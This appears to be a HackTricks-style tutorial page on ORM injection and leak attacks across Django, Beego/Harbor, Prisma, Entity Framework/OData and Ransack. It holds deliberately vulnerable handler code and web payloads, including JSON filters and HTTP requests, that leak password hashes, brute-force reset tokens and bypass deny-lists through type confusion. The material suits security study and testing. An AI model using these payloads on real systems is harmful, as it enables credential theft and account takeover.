_body: "# ORM Injection\n\n{{#include ../banners/hacktricks-training.md}}\n\n## Django ORM (Python)\n\nIn [**this post**](https://www.elttam.com/blog/plormbing-your-django-orm/)\
  \ is explained how it's possible to make a Django ORM vulnerable by using for example a code like:\n\n<pre class=\"language-python\"\
  ><code class=\"lang-python\">class ArticleView(APIView):\n    \"\"\"\n        Some basic API view that users send requests\
  \ to for\n        searching for articles\n    \"\"\"\n    def post(self, request: Request, format=None):\n        try:\n\
  <strong>            articles = Article.objects.filter(**request.data)\n</strong>            serializer = ArticleSerializer(articles,\
  \ many=True)\n        except Exception as e:\n            return Response([])\n        return Response(serializer.data)\n\
  </code></pre>\n\nNote how all the request.data (which will be a json) is directly passed to **filter objects from the database**.\
  \ An attacker could send unexpected filters in order to leak more data than expected from it.\n\nExamples:\n\n- **Login:**\
  \ In a simple login try to leak the passwords of the users registered inside of it.\n\n```json\n{\n  \"username\": \"admin\"\
  ,\n  \"password_startswith\": \"a\"\n}\n```\n\n> [!CAUTION]\n> It's possible to brute-force the password until it's leaked.\n\
  \n- **Relational filtering**: It's possible to traverse relations in order to leak information from columns that weren't\
  \ even expected to be used in the operation. For example, if it's possible to leak articles created by a user withe these\
  \ relations: Article(`created_by`) -\\[1..1]-> Author (`user`) -\\[1..1]-> User(`password`).\n\n```json\n{\n  \"created_by__user__password__contains\"\
  : \"pass\"\n}\n```\n\n> [!CAUTION]\n> It's possible to find the password of all the users that have created an article\n\
  \n- **Many-to-many relational filtering**: In the previous example we couldn't find passwords of users that haven't created\
  \ an article. However, following other relationships this is possible. For example: Article(`created_by`) -\\[1..1]-> Author(`departments`)\
  \ -\\[0..\\*]-> Department(`employees`) -\\[0..\\*]-> Author(`user`) -\\[1..1]-> User(`password`).\n\n```json\n{\n  \"created_by__departments__employees__user_startswith\"\
  : \"admi\"\n}\n```\n\n> [!CAUTION]\n> In this case we can find all the users in the departments of users that have created\
  \ articles and then leak their passwords (in the previous json we are just leaking the usernames but then it's possible\
  \ to leak the passwords).\n\n- **Abusing Django Group and Permission many-to-may relations with users**: Moreover, the AbstractUser\
  \ model is used to generate users in Django and by default this model has some **many-to-many relationships with the Permission\
  \ and Group tables**. Which basically is a default way to **access other users from one user** if they are in the **same\
  \ group or share the same permission**.\n\n```bash\n# By users in the same group\ncreated_by__user__groups__user__password\n\
  \n# By users with the same permission\ncreated_by__user__user_permissions__user__password\n```\n\n- **Bypass filter restrictions**:\
  \ The same blogpost proposed to bypass the use of some filtering like `articles = Article.objects.filter(is_secret=False,\
  \ **request.data)`. t's possible to dump articles that have is_secret=True because we can loop back from a relationship\
  \ to the Article table and leak secret articles from non secret articles because the results are joined and the is_secret\
  \ field is checked in the non secret article while the data is leaked from the secret article.\n\n```bash\nArticle.objects.filter(is_secret=False,\
  \ categories__articles__id=2)\n```\n\n> [!CAUTION]\n> Abusing relationships it's possible to bypass even filters meant to\
  \ protect the data shown.\n\n- **Error/Time based via ReDoS**: In the previous examples it was expected to have different\
  \ responses if the filtering worked or not to use that as oracle. But it could be possible that some action is done in the\
  \ database and the response is always the same. In this scenario it could be possible to make the database error to get\
  \ a new oracle.\n\n```json\n// Non matching password\n{\n    \"created_by__user__password__regex\": \"^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$\"\
  \n}\n\n// ReDoS matching password (will show some error in the response or check the time)\n{\"created_by__user__password__regex\"\
  : \"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$\"}\n```\n\nFrom te same post regarding this vector:\n\n- **SQLite**: Doesn't have\
  \ a regexp operator by default (require loading a third-party extension)\n- **PostgreSQL**: Doesn't have a default regex\
  \ timeout and it's less prone to backtracking\n- **MariaDB**: Doesn't have a regex timeout\n\n## Beego ORM (Go) & Harbor\
  \ Filter Oracles\n\nBeego mirrors Django’s `field__operator` DSL, so any handler that lets users control the first argument\
  \ to `QuerySeter.Filter()` exposes the entire graph of relations:\n\n```go\nqs := o.QueryTable(\"articles\")\nqs = qs.Filter(filterExpression,\
  \ filterValue) // attacker controls key + operator\n```\n\nRequests such as `/search?filter=created_by__user__password__icontains=pbkdf`\
  \ can pivot through foreign keys exactly like the Django primitives above. Harbor’s `q` helper parsed user input into Beego\
  \ filters, so low-privileged users could probe secrets by watching list responses:\n\n- `GET /api/v2.0/users?q=password=~$argon2id$`\
  \ → reveals whether any hash contains `$argon2id$`.\n- `GET /api/v2.0/users?q=salt=~abc` → leaks salt substrings.\n\nCounting\
  \ returned rows, observing pagination metadata, or comparing response lengths gives an oracle to brute-force entire hashes,\
  \ salts, and TOTP seeds.\n\n### Bypassing Harbor’s patches with `parseExprs`\n\nHarbor attempted to protect sensitive fields\
  \ by tagging them with `filter:\"false\"` and validating only the first segment of the expression:\n\n```go\nk := strings.SplitN(key,\
  \ orm.ExprSep, 2)[0]\nif _, ok := meta.Filterable(k); !ok { continue }\nqs = qs.Filter(key, value)\n```\n\nBeego’s internal\
  \ `parseExprs` walks every `__`-delimited segment and, when the current segment is **not** a relation, it simply overwrites\
  \ the target field with the next segment. Payloads such as `email__password__startswith=foo` therefore pass Harbor’s `Filterable(email)=true`\
  \ check but execute as `password__startswith=foo`, bypassing deny-lists.\n\nv2.13.1 limited keys to a single separator,\
  \ but Harbor’s own fuzzy-match builder appends operators after validation: `q=email__password=~abc` → `Filter(\"email__password__icontains\"\
  , \"abc\")`. The ORM again interprets that as `password__icontains`. Beego apps that only inspect the first `__` component\
  \ or that append operators later in the request pipeline stay vulnerable to the same overwrite primitive and can still be\
  \ abused as blind leak oracles.\n\n## Prisma ORM (NodeJS)\n\nThe following are [**tricks extracted from this post**](https://www.elttam.com/blog/plorming-your-primsa-orm/).\n\
  \n- **Full find contro**l:\n\n<pre class=\"language-javascript\"><code class=\"lang-javascript\">const app = express();\n\
  \napp.use(express.json());\n\napp.post('/articles/verybad', async (req, res) => {\n    try {\n        // Attacker has full\
  \ control of all prisma options\n<strong>        const posts = await prisma.article.findMany(req.body.filter)\n</strong>\
  \        res.json(posts);\n    } catch (error) {\n        res.json([]);\n    }\n});\n</code></pre>\n\nIt's possible to see\
  \ that the whole javascript body is passed to prisma to perform queries.\n\nIn the example from the original post, this\
  \ would check all the posts createdBy someone (each post is created by someone) returning also the user info of that someone\
  \ (username, password...)\n\n```json\n{\n    \"filter\": {\n        \"include\": {\n            \"createdBy\": true\n  \
  \      }\n    }\n}\n\n// Response\n[\n    {\n        \"id\": 1,\n        \"title\": \"Buy Our Essential Oils\",\n      \
  \  \"body\": \"They are very healthy to drink\",\n        \"published\": true,\n        \"createdById\": 1,\n        \"\
  createdBy\": {\n            \"email\": \"karen@example.com\",\n            \"id\": 1,\n            \"isAdmin\": false,\n\
  \            \"name\": \"karen\",\n            \"password\": \"super secret passphrase\",\n            \"resetToken\": \"\
  2eed5e80da4b7491\"\n        }\n    },\n    ...\n]\n```\n\nThe following one selects all the posts created by someone with\
  \ a password and wil return the password:\n\n```json\n{\n    \"filter\": {\n        \"select\": {\n            \"createdBy\"\
  : {\n                \"select\": {\n                    \"password\": true\n                }\n            }\n        }\n\
  \    }\n}\n\n// Response\n[\n    {\n        \"createdBy\": {\n            \"password\": \"super secret passphrase\"\n  \
  \      }\n    },\n    ...\n]\n```\n\n- **Full where clause control**:\n\nLet's take a look to this where the attack can\
  \ control the `where` clause:\n\n<pre class=\"language-javascript\"><code class=\"lang-javascript\">app.get('/articles',\
  \ async (req, res) => {\n    try {\n        const posts = await prisma.article.findMany({\n<strong>            where: req.query.filter\
  \ as any // Vulnerable to ORM Leaks\n</strong>        })\n        res.json(posts);\n    } catch (error) {\n        res.json([]);\n\
  \    }\n});\n</code></pre>\n\nIt's possible to filter the password of users directly like:\n\n```javascript\nawait prisma.article.findMany({\n\
  \  where: {\n    createdBy: {\n      password: {\n        startsWith: \"pas\",\n      },\n    },\n  },\n})\n```\n\n> [!CAUTION]\n\
  > Using operations like `startsWith` it's possible to leak information.\n\n- **Many-to-many relational filtering bypassing\
  \ filtering:**\n\n```javascript\napp.post(\"/articles\", async (req, res) => {\n  try {\n    const query = req.body.query\n\
  \    query.published = true\n    const posts = await prisma.article.findMany({ where: query })\n    res.json(posts)\n  }\
  \ catch (error) {\n    res.json([])\n  }\n})\n```\n\nIt's possible to leak not published articles by lopping back to the\
  \ many-to-many relationships between `Category` -\\[\\*..\\*]-> `Article`:\n\n```json\n{\n  \"query\": {\n    \"categories\"\
  : {\n      \"some\": {\n        \"articles\": {\n          \"some\": {\n            \"published\": false,\n            \"\
  {articleFieldToLeak}\": {\n              \"startsWith\": \"{testStartsWith}\"\n            }\n          }\n        }\n \
  \     }\n    }\n  }\n}\n```\n\nIt's also possible to leak all the users abusing some loop back many-to-many relationships:\n\
  \n```json\n{\n  \"query\": {\n    \"createdBy\": {\n      \"departments\": {\n        \"some\": {\n          \"employees\"\
  : {\n            \"some\": {\n              \"departments\": {\n                \"some\": {\n                  \"employees\"\
  : {\n                    \"some\": {\n                      \"departments\": {\n                        \"some\": {\n  \
  \                        \"employees\": {\n                            \"some\": {\n                              \"{fieldToLeak}\"\
  : {\n                                \"startsWith\": \"{testStartsWith}\"\n                              }\n           \
  \                 }\n                          }\n                        }\n                      }\n                 \
  \   }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n\
  \  }\n}\n```\n\n- **Error/Timed queries**: In the original post you can read an very extensive set of tests performed in\
  \ order to find the optimal payload to leak information with a time based payload. This is:\n\n```json\n{\n    \"OR\": [\n\
  \        {\n            \"NOT\": {ORM_LEAK}\n        },\n        {CONTAINS_LIST}\n    ]\n}\n```\n\nWhere the `{CONTAINS_LIST}`\
  \ is a list with 1000 strings to make sure the **response is delayed when the correct leak is found.**\n\n### Type confusion\
  \ on `where` filters (operator injection)\n\nPrisma’s query API accepts either primitive values or operator objects. When\
  \ handlers assume the request body contains plain strings but pass them directly to `where`, attackers can smuggle operators\
  \ into authentication flows and bypass token checks.\n\n```ts\nconst user = await prisma.user.findFirstOrThrow({\n    where:\
  \ { resetToken: req.body.resetToken as string }\n})\n```\n\nCommon coercion vectors:\n\n- **JSON body** (default `express.json()`):\
  \ `{\"resetToken\":{\"not\":\"E\"},\"password\":\"newpass\"}` ⇒ matches every user whose token is not `E`.\n- **URL-encoded\
  \ body** with `extended: true`: `resetToken[not]=E&password=newpass` becomes the same object.\n- **Query string** in Express\
  \ <5 or with extended parsers: `/reset?resetToken[contains]=argon2` leaks substring matches.\n- **cookie-parser** JSON cookies:\
  \ `Cookie: resetToken=j:{\"startsWith\":\"0x\"}` if cookies are forwarded to Prisma.\n\nBecause Prisma happily evaluates\
  \ `{ resetToken: { not: ... } }`, `{ contains: ... }`, `{ startsWith: ... }`, etc., any equality check on secrets (reset\
  \ tokens, API keys, magic links) can be widened into a predicate that succeeds without knowing the secret. Combine this\
  \ with relational filters (`createdBy`) to pick a victim.\n\nLook for flows where:\n\n- Request schemas aren't enforced,\
  \ so nested objects survive deserialization.\n- Extended body/query parsers stay enabled and accept bracket syntax.\n- Handlers\
  \ forward user JSON directly into Prisma instead of mapping onto allow-listed fields/operators.\n\n## Entity Framework &\
  \ OData Filter Leaks\n\n### Reflection-based text helpers leak secrets\n\n<details>\n<summary>Microsoft TextFilter helper\
  \ abused for leaks</summary>\n\n```csharp\nIQueryable<T> TextFilter<T>(IQueryable<T> source, string term) {\n    var stringProperties\
  \ = typeof(T).GetProperties().Where(p => p.PropertyType == typeof(string));\n    if (!stringProperties.Any()) { return source;\
  \ }\n    var containsMethod = typeof(string).GetMethod(\"Contains\", new[] { typeof(string) });\n    var prm = Expression.Parameter(typeof(T));\n\
  \    var body = stringProperties\n        .Select(prop => Expression.Call(Expression.Property(prm, prop), containsMethod!,\
  \ Expression.Constant(term)))\n        .Aggregate(Expression.OrElse);\n    return source.Where(Expression.Lambda<Func<T,\
  \ bool>>(body, prm));\n}\n```\n</details>\n\nHelpers that enumerate every string property and wrap them inside `.Contains(term)`\
  \ effectively expose passwords, API tokens, salts, and TOTP secrets to any user who can call the endpoint. Directus **CVE-2025-64748**\
  \ is a real-world example where the `directus_users` search endpoint included `token` and `tfa_secret` in its generated\
  \ `LIKE` predicates, turning result counts into a leak oracle.\n\n### OData comparison oracles\n\nASP.NET OData controllers\
  \ often return `IQueryable<T>` and allow `$filter`, even when functions such as `contains` are disabled. As long as the\
  \ EDM exposes the property, attackers can still compare on it:\n\n```\nGET /odata/Articles?$filter=CreatedBy/TfaSecret ge\
  \ 'M'&$top=1\nGET /odata/Articles?$filter=CreatedBy/TfaSecret lt 'M'&$top=1\n```\n\nThe mere presence or absence of results\
  \ (or pagination metadata) lets you binary-search each character according to the database collation. Navigation properties\
  \ (`CreatedBy/Token`, `CreatedBy/User/Password`) enable relational pivots similar to Django/Beego, so any EDM that exposes\
  \ sensitive fields or skips per-property deny-lists is an easy target.\n\nLibraries and middleware that translate user strings\
  \ into ORM operators (e.g., Entity Framework dynamic LINQ helpers, Prisma/Sequelize wrappers) should be treated as high-risk\
  \ sinks unless they implement strict field/operator allow-lists.\n\n## **Ransack (Ruby)**\n\nThese tricks where [**found\
  \ in this post**](https://positive.security/blog/ransack-data-exfiltration)**.**\n\n> [!TIP]\n> **Note that Ransack 4.0.0.0\
  \ now enforce the use of explicit allow list for searchable attributes and associations.**\n\n**Vulnerable example:**\n\n\
  ```ruby\ndef index\n  @q = Post.ransack(params[:q])\n  @posts = @q.result(distinct: true)\nend\n```\n\nNote how the query\
  \ will be defined by the parameters sent by the attacker. It was possible to for example brute-force the reset token with:\n\
  \n```http\nGET /posts?q[user_reset_password_token_start]=0\nGET /posts?q[user_reset_password_token_start]=1\n...\n```\n\n\
  By brute-forcing and potentially relationships it was possible to leak more data from a database.\n\n## Collation-aware\
  \ leak strategies\n\nString comparisons inherit the database collation, so leak oracles must be designed around how the\
  \ backend orders characters:\n\n- Default MariaDB/MySQL/SQLite/MSSQL collations are often case-insensitive, so `LIKE`/`=`\
  \ cannot distinguish `a` from `A`. Use case-sensitive operators (regex/GLOB/BINARY) when the secret’s casing matters.\n\
  - Prisma and Entity Framework mirror the database ordering. Collations such as MSSQL’s `SQL_Latin1_General_CP1_CI_AS` place\
  \ punctuation before digits and letters, so binary-search probes must follow that ordering rather than raw ASCII byte order.\n\
  - SQLite’s `LIKE` is case-insensitive unless a custom collation is registered, so Django/Beego leaks may need `__regex`\
  \ predicates to recover case-sensitive tokens.\n\nCalibrating payloads to the real collation avoids wasted probes and significantly\
  \ speeds up automated substring/binary-search attacks.\n\n## References\n\n- [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)\n\
